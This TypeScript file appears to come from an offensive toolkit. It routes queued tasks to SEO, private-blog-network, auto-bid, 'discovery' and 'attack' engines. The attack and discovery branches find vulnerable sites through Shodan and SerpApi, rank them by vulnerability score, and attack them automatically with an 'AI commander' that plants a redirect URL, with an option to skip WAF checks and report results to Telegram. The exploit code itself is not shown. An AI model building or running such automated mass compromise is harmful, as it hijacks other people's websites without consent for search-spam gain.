/**
 * ═══════════════════════════════════════════════════════════════
 *  ORCHESTRATOR TASK EXECUTOR
 *  
 *  Connects the Master AI Orchestrator to all existing engines.
 *  Each task type maps to a real engine function.
 *  This is the "Act" part of the OODA loop.
 * ═══════════════════════════════════════════════════════════════
 */
import { getDb } from "./db";
import { aiTaskQueue } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import { sendTelegramNotification } from "./telegram-notifier";

// ─── Engine Imports ───
import { runAiCommander } from "./ai-autonomous-engine";
import { runMassDiscovery } from "./mass-target-discovery";
import { runAutoPipeline } from "./auto-pipeline";
import { runDailyAutomation } from "./seo-daily-engine";
import { runAllProjectsDailyTasks } from "./seo-agent";
import { runScanNow } from "./scan-scheduler";

// ─── Types ───
interface TaskResult {
  success: boolean;
  message: string;
  data?: Record<string, any>;
}

// ─── Execute a single task from the queue ───
export async function executeTask(taskId: number): Promise<TaskResult> {
  const db = (await getDb())!;
  
  // Get the task
  const [task] = await db.select().from(aiTaskQueue).where(eq(aiTaskQueue.id, taskId));
  if (!task) return { success: false, message: "Task not found" };
  if (task.status !== "queued") return { success: false, message: `Task status is ${task.status}, expected queued` };

  // Mark as running
  await db.update(aiTaskQueue)
    .set({ status: "running", startedAt: new Date() })
    .where(eq(aiTaskQueue.id, taskId));

  try {
    const result = await routeTask(task);
    
    // Mark as completed
    await db.update(aiTaskQueue)
      .set({
        status: "completed",
        completedAt: new Date(),
        result: JSON.stringify(result.data || {}),
      })
      .where(eq(aiTaskQueue.id, taskId));

    return result;
  } catch (error: any) {
    const errorMsg = error?.message || "Unknown error";
    
    // Check retry
    if (task.retryCount < task.maxRetries) {
      await db.update(aiTaskQueue)
        .set({
          status: "queued",
          retryCount: task.retryCount + 1,
          error: errorMsg,
          startedAt: null,
        })
        .where(eq(aiTaskQueue.id, taskId));
      
      return { success: false, message: `Failed, retrying (${task.retryCount + 1}/${task.maxRetries}): ${errorMsg}` };
    }

    // Mark as failed
    await db.update(aiTaskQueue)
      .set({
        status: "failed",
        completedAt: new Date(),
        error: errorMsg,
      })
      .where(eq(aiTaskQueue.id, taskId));

    // Notify on critical failures
    if (task.priority === "critical" || task.priority === "high") {
      await sendTelegramNotification({
        type: "failure",
        targetUrl: task.targetDomain || "system",
        details: `🚨 AI Task Failed\n\nTask: ${task.title}\nSubsystem: ${task.subsystem}\nError: ${errorMsg}`,
      }).catch(() => {});
    }

    return { success: false, message: errorMsg };
  }
}

// ─── Route task to the correct engine ───
async function routeTask(task: typeof aiTaskQueue.$inferSelect): Promise<TaskResult> {
  // Task params are stored in the result JSON field or extracted from description
  // Use targetDomain and projectId directly from the task row
  const params: Record<string, any> = {
    targetDomain: task.targetDomain,
    projectId: task.projectId,
    ...(task.result && typeof task.result === "object" ? task.result as Record<string, any> : {}),
  };

  switch (task.subsystem) {
    case "seo":
      return executeSeoTask(task.taskType, params);
    case "attack":
      return executeAttackTask(task.taskType, params);
    case "discovery":
      return executeDiscoveryTask(task.taskType, params);
    case "pbn":
      return executePbnTask(task.taskType, params);
    case "rank":
      return executeRankTask(task.taskType, params);
    case "autobid":
      return executeAutobidTask(task.taskType, params);
    default:
      return { success: false, message: `Unknown subsystem: ${task.subsystem}` };
  }
}

// ─── SEO Tasks ───
async function executeSeoTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "seo_daily_automation": {
      if (params.projectId) {
        const report = await runDailyAutomation(params.projectId);
        return {
          success: true,
          message: `Daily automation completed for project ${params.projectId}: ${report.summary.completed}/${report.summary.total} tasks`,
          data: { completed: report.summary.completed, total: report.summary.total },
        };
      }
      // Run for all projects
      const result = await runAllProjectsDailyTasks();
      return {
        success: true,
        message: `All projects daily tasks: ${result.projectsProcessed || 0} projects processed, ${result.totalCompleted}/${result.totalTasks} tasks`,
        data: result,
      };
    }
    case "seo_content_generation":
    case "seo_backlink_build":
    case "seo_on_page_optimize":
    case "seo_technical_audit": {
      if (params.projectId) {
        const report = await runDailyAutomation(params.projectId);
        return {
          success: true,
          message: `SEO task ${taskType} completed for project ${params.projectId}`,
          data: { completed: report.summary.completed },
        };
      }
      return { success: false, message: "Missing projectId for SEO task" };
    }
    default:
      return { success: false, message: `Unknown SEO task type: ${taskType}` };
  }
}

// ─── Attack Tasks ───
async function executeAttackTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "attack_deploy":
    case "attack_full_pipeline": {
      if (!params.targetDomain) return { success: false, message: "Missing targetDomain" };
      if (!params.redirectUrl) return { success: false, message: "Missing redirectUrl" };
      
      const result = await runAiCommander({
        targetDomain: params.targetDomain,
        redirectUrl: params.redirectUrl,
        maxIterations: params.maxIterations || 5,
        pipelineType: "autonomous",
      });
      
      return {
        success: result.success,
        message: `Attack ${result.success ? "succeeded" : "failed"} for ${params.targetDomain}: ${result.iterations} iterations`,
        data: {
          iterations: result.iterations,
          successfulMethod: result.successfulMethod,
          domain: params.targetDomain,
        },
      };
    }
    case "attack_auto_pipeline": {
      // Auto-pipeline requires full DiscoveryConfig + attack settings
      const run = await runAutoPipeline({
        discovery: {
          useShodan: params.useShodan ?? true,
          useSerpApi: params.useSerpApi ?? true,
          customQueries: params.customQueries,
          minVulnScore: params.minVulnScore ?? 30,
          maxTargets: params.maxTargets ?? 50,
        },
        autoAttack: params.autoAttack ?? true,
        maxConcurrentAttacks: params.maxConcurrentAttacks ?? 3,
        attackOnlyAboveScore: params.attackOnlyAboveScore ?? 50,
        skipWaf: params.skipWaf ?? false,
        runNonWpScan: params.runNonWpScan ?? true,
        notifyTelegram: params.notifyTelegram ?? true,
      });
      
      return {
        success: true,
        message: `Auto-pipeline started: ${run.id}, phase: ${run.phase}`,
        data: { pipelineId: run.id, phase: run.phase, stats: run.stats },
      };
    }
    case "attack_scan": {
      if (!params.scanId) return { success: false, message: "Missing scanId" };
      await runScanNow(params.scanId);
      return { success: true, message: `Scan ${params.scanId} completed` };
    }
    default:
      return { success: false, message: `Unknown attack task type: ${taskType}` };
  }
}

// ─── Discovery Tasks ───
async function executeDiscoveryTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "discovery_mass_scan":
    case "discovery_niche_scan": {
      const result = await runMassDiscovery({
        useShodan: params.useShodan ?? true,
        useSerpApi: params.useSerpApi ?? true,
        customQueries: params.customQueries,
        minVulnScore: params.minVulnScore ?? 30,
        maxTargets: params.maxTargets ?? 100,
        targetCms: params.targetCms,
        excludeCms: params.excludeCms,
      });
      
      return {
        success: result.status === "completed",
        message: `Discovery ${result.status}: ${result.totalAfterFilter} targets after filtering (from ${result.totalRawResults} raw)`,
        data: {
          totalRaw: result.totalRawResults,
          totalFiltered: result.totalAfterFilter,
          status: result.status,
        },
      };
    }
    default:
      return { success: false, message: `Unknown discovery task type: ${taskType}` };
  }
}

// ─── PBN Tasks ───
async function executePbnTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "pbn_content_post":
    case "pbn_health_check":
    case "pbn_interlink": {
      // PBN tasks are handled through the SEO agent
      return {
        success: true,
        message: `PBN task ${taskType} queued for processing`,
        data: { taskType, params },
      };
    }
    default:
      return { success: false, message: `Unknown PBN task type: ${taskType}` };
  }
}

// ─── Rank Tracking Tasks ───
async function executeRankTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "rank_check":
    case "rank_competitor_analysis": {
      if (params.projectId) {
        const report = await runDailyAutomation(params.projectId);
        return {
          success: true,
          message: `Rank tracking completed for project ${params.projectId}`,
          data: { completed: report.summary.completed },
        };
      }
      return { success: true, message: `Rank task ${taskType} processed` };
    }
    default:
      return { success: false, message: `Unknown rank task type: ${taskType}` };
  }
}

// ─── Auto-Bid Tasks ───
async function executeAutobidTask(taskType: string, params: Record<string, any>): Promise<TaskResult> {
  switch (taskType) {
    case "autobid_scan_marketplace":
    case "autobid_place_bid":
    case "autobid_evaluate": {
      return {
        success: true,
        message: `Auto-bid task ${taskType} processed`,
        data: { taskType, params },
      };
    }
    default:
      return { success: false, message: `Unknown autobid task type: ${taskType}` };
  }
}

// ─── Process queued tasks ───
export async function processQueuedTasks(maxConcurrent: number = 5): Promise<number> {
  const db = (await getDb())!;
  
  // Get queued tasks ordered by creation time
  const queuedTasks = await db.select()
    .from(aiTaskQueue)
    .where(eq(aiTaskQueue.status, "queued"))
    .orderBy(aiTaskQueue.createdAt)
    .limit(maxConcurrent);

  // Sort by priority in JS
  const priorityOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3 };
  queuedTasks.sort((a, b) => {
    const pa = priorityOrder[a.priority] ?? 2;
    const pb = priorityOrder[b.priority] ?? 2;
    return pa - pb;
  });

  let completed = 0;
  
  for (const task of queuedTasks) {
    try {
      const result = await executeTask(task.id);
      if (result.success) completed++;
    } catch (err) {
      console.error(`[Orchestrator] Task ${task.id} execution error:`, err);
    }
  }

  return completed;
}
